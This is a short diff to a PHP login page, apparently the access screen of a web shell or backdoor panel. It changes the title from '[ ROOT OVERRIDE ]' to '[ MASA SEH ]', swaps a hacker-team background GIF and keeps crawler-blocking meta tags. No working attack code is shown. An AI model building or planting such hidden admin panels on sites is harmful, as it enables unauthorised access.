@@ -321,7 +321,7 @@ function render_login($err=''){
 <html lang="en" class="dark">
 <head>
   <meta charset="utf-8">
-  <title>[ ROOT OVERRIDE ]</title>
+  <title>[ MASA SEH ]</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
   <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
@@ -364,7 +364,7 @@ function render_login($err=''){
       min-height:100vh;
       background:
         linear-gradient(rgba(11,18,32,.35), rgba(11,18,32,.35)),
-        url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrti_wkwQ28cRU5m9tvxFZkyMmGv4Md8jbND9aREJiIXfNah9eBTyWvoX9WWxYRvYoiqjc3T4k1qrVtOdDXjkOpYFsLCusuHK6DnmXH83WcTrjoWUFsF87R7VllqYlxzFRzNNEf-QqIVGAga19eP74hzZeGzX87b0ZnjT7HU8tHpTT1oVz_i9zF94iGmw/s736/teamfuvking.gif") center/cover no-repeat;
+        url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUEFPPJcSmGCBy_zFIE9_1N4HfZ8B-qmSel4TUNqmYNWPhC2jHKV9a_9mDRfdK3lL_dSO67R_wkHFgnPivs0UkcP8GJdk5j8EMkZS9dd01PjXRRnVYH0jZUNAvRsbPAYTiy1Nn386E3BzHEMEQ6jACByjN5su82pLbGdROmtY5roWCTfo_8BQTGtU8It8/s320/popular-gif.gif") center/cover no-repeat;
       display:flex;
       align-items:center;
       justify-content:center;
